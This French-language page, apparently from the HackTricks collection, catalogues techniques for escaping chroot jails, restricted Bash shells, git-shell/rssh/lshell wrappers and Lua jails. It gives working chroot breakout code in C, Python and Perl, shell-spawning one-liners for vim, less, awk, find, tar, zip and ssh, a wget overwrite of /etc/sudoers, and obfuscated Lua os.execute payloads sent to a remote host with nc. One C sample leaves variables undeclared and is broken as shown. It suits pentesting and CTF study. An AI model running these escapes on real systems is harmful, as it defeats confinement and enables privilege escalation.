# S'échapper des Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Recherchez sur** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **si vous pouvez exécuter un binaire avec la propriété « Shell »**

## Évasions de Chroot

D'après [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) : Le mécanisme chroot n'est **pas destiné à se défendre** contre une altération intentionnelle par des utilisateurs **privilégiés** (**root**). Sur la plupart des systèmes, les contextes chroot ne s'empilent pas correctement et les programmes chrootés **disposant de privilèges suffisants peuvent effectuer un second chroot pour s'échapper**.\
Habituellement, cela signifie que pour vous échapper, vous devez être root à l'intérieur du chroot.<sup>[[4]](#references)</sup>

> [!TIP]
> L'**outil** [**chw00t**](https://github.com/earthquake/chw00t) a été créé pour exploiter les scénarios suivants et s'échapper de `chroot`.<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> Si vous êtes **root** à l'intérieur d'un chroot, vous **pouvez vous échapper** en créant **un autre chroot**. Cela se produit parce que 2 chroots ne peuvent pas coexister (sous Linux) ; ainsi, si vous créez un dossier puis **créez un nouveau chroot** dans ce nouveau dossier alors que **vous êtes à l'extérieur de celui-ci**, vous serez désormais **à l'extérieur du nouveau chroot** et serez donc dans le FS.
>
> Cela se produit parce que chroot ne déplace généralement **PAS** votre répertoire de travail vers celui indiqué ; vous pouvez donc créer un chroot tout en étant à l'extérieur de celui-ci.<sup>[[4]](#references)[[5]](#references)</sup>

Habituellement, vous ne trouverez pas le binaire `chroot` à l'intérieur d'une jail chroot, mais vous **pourriez compiler, téléverser et exécuter** un binaire :

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Ceci est similaire au cas précédent, mais dans ce cas, l'**attaquant enregistre un descripteur de fichier vers le répertoire courant**, puis **crée le chroot dans un nouveau dossier**. Enfin, comme il a **accès** à ce **FD** **en dehors** du chroot, il y accède et **s'en échappe**.<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD can be passed over Unix Domain Sockets, so:
>
> - Créer un processus enfant (fork)
> - Créer une UDS pour que le parent et l'enfant puissent communiquer
> - Exécuter chroot dans le processus enfant, dans un dossier différent
> - Dans le processus parent, créer un FD vers un dossier situé en dehors du chroot du nouveau processus enfant
> - Passer ce FD au processus enfant à l'aide de l'UDS
> - Le processus enfant effectue un chdir vers ce FD et, comme celui-ci se trouve en dehors de son chroot, il s'échappera de la jail.<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - Monter le périphérique root (/) dans un dossier situé à l'intérieur du chroot
> - Effectuer un chroot vers ce dossier
>
> Cela est possible sous Linux.<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - Monter procfs dans un dossier situé à l'intérieur du chroot (si ce n'est pas déjà fait)
> - Chercher un pid qui possède une entrée root/cwd différente, comme : /proc/1/root
> - Effectuer un chroot vers cette entrée.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - Créer un Fork (processus enfant), effectuer un chroot vers un dossier différent plus profond dans le FS, puis s'y déplacer avec CD
> - Depuis le processus parent, déplacer le dossier dans lequel se trouve le processus enfant vers un dossier situé avant le chroot de l'enfant dans l'arborescence
> - Ce processus enfant se retrouvera en dehors du chroot.<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - La possibilité pour un processus de s'attacher avec `ptrace` dépend des identifiants, des capabilities et des security modules activés tels que Yama ; le debugging entre utilisateurs identiques peut donc être limité par la policy du système.<sup>[[8]](#references)</sup>
> - Si l'attachement est autorisé, vous pouvez utiliser ptrace sur un processus et exécuter un shellcode à l'intérieur de celui-ci ([voir cet exemple](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Énumération

Obtenir des informations sur la jail :
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Modifier PATH

Vérifiez si vous pouvez modifier la variable d’environnement PATH.<sup>[[2]](#references)</sup>
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Utiliser vim

Si Vim est disponible, définissez son option `shell` sur un shell que vous pouvez exécuter, puis invoquez `:shell`.<sup>[[10]](#references)</sup>
```bash
:set shell=/bin/sh
:shell
```
### Pagers et visionneuses d'aide

De nombreux environnements restreints laissent encore des **pagers** ou des **visionneuses d'aide** disponibles. Il est généralement plus rapide de les exploiter que d'essayer de reconstruire `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Si `git` est disponible, son option `--paginate` envoie la sortie vers `less` ou `$PAGER`, ce qui est utile lorsqu’une échappatoire via un pager est disponible.<sup>[[9]](#references)</sup>
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### One-liners courantes de GTFOBins

Une fois que vous savez quels binaires sont accessibles, testez d’abord les lanceurs de shell évidents :
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Si vous pouvez uniquement **injecter des arguments** dans une commande autorisée (au lieu de l'exécuter librement), consultez également **GTFOArgs**.<sup>[[17]](#references)</sup>

### Créer un script

Vérifiez si vous pouvez créer un fichier exécutable contenant _/bin/bash_ en tant que contenu
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Obtenir bash via SSH

Si vous accédez au serveur via ssh, vous pouvez souvent lui demander d’exécuter un **programme différent** au lieu du shell de connexion restreint.<sup>[[14]](#references)</sup>
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Si `ssh` fait partie des rares binaires autorisés localement, rappelez-vous qu’il peut également être détourné comme **GTFOBin** ; ses options `LocalCommand` et `ProxyCommand` exécutent des commandes auxiliaires configurées localement.<sup>[[14]](#references)[[15]](#references)</sup>
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare

Dans Bash, un nameref redirige les affectations vers une autre variable, tandis que l’ajout d’un élément à `BASH_CMDS` ajoute cette commande à la table de hachage interne des commandes de Bash.<sup>[[11]](#references)[[12]](#references)</sup>
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

L'option `-O` de Wget écrit le contenu téléchargé dans le fichier de sortie spécifié ; si ce chemin est accessible en écriture, cela peut écraser un fichier tel que `/etc/sudoers`.<sup>[[13]](#references)</sup>
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Wrappers de shell restreints (`git-shell`, `rssh`, `lshell`)

Certains environnements ne vous placent pas dans un `rbash` classique, mais dans des **wrappers** tels que `git-shell`, `rssh` ou `lshell` :

- `git-shell` accepte uniquement les commandes Git côté serveur ainsi que tout ce qui se trouve dans `~/git-shell-commands/`. Si ce répertoire existe, exécutez `help` pour énumérer les actions personnalisées autorisées. Si vous pouvez y **écrire**, tout exécutable déposé dans ce répertoire devient accessible.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` autorisent généralement uniquement `scp`, `sftp`, `rsync` ou les opérations de type Git. Dans ces cas, concentrez-vous d'abord sur les **primitives d'écriture de fichiers** : téléversez `authorized_keys`, un fichier de démarrage du shell ou un script auxiliaire dans un emplacement accessible en écriture, puis reconnectez-vous avec `ssh -t ...`.
- Si le wrapper filtre uniquement la ligne de commande, énumérez les binaires accessibles, puis revenez à **GTFOBins / GTFOArgs**.

### Autres astuces

Vérifiez également :

- [**Fireshell Security - Techniques d'évasion des Restricted Linux Shells**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Évasion des Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**La page suivante pourrait également être intéressante :**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Jails Python

Vous trouverez des astuces pour vous échapper des jails Python sur la page suivante :


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Jails Lua

Sur cette page, vous trouverez les fonctions globales auxquelles vous avez accès dans Lua : [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base).<sup>[[16]](#references)</sup>

Les fonctions standard `load`, `string.char` et `os.execute` peuvent construire et exécuter ce chunk lorsqu'elles sont disponibles.<sup>[[16]](#references)</sup>
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Une fonction de table peut également être récupérée avec `rawget` plutôt qu’avec la syntaxe pointée.<sup>[[16]](#references)</sup>
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Utilisez `pairs` pour énumérer une table de bibliothèque.<sup>[[16]](#references)</sup>
```bash
for k,v in pairs(string) do print(k,v) end
```
L’ordre dans lequel `pairs` énumère les indices de table n’est pas spécifié ; ne vous fiez donc pas à l’apparition d’une fonction particulière en premier. Si vous devez exécuter une fonction précise, vous pouvez effectuer une attaque par force brute en chargeant différents environnements Lua et en appelant la première fonction de la bibliothèque.<sup>[[16]](#references)</sup>
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Obtenir un shell lua interactif** : Si vous êtes dans un shell lua limité, vous pouvez obtenir un nouveau shell lua (et, espérons-le, illimité) en appelant `debug.debug()`, ce qui active un mode interactif.<sup>[[16]](#references)</sup>
```bash
debug.debug()
```
## References

- [1] [Chw00t: Comment s'échapper de diverses solutions chroot (Bucsay Balazs, présentation et diapositives DeepSec)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [Manuel de référence GNU Bash – Le shell restreint](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Documentation Git](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – page du manuel Linux](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – outil d'évasion de chroot](https://github.com/earthquake/chw00t)
- [6] [unix(7) – page du manuel Linux](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – page du manuel Linux](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – page du manuel Linux](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Documentation Git](https://git-scm.com/docs/git)
- [10] [:shell – Documentation Vim](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Builtins Bash – Manuel de référence GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Variables Bash – Manuel de référence GNU Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [Manuel GNU Wget](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – page du manuel OpenBSD](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – page du manuel OpenBSD](https://man.openbsd.org/ssh_config)
- [16] [Manuel de référence Lua 5.4](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs : liste des vecteurs d'exploitation par injection d'arguments](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
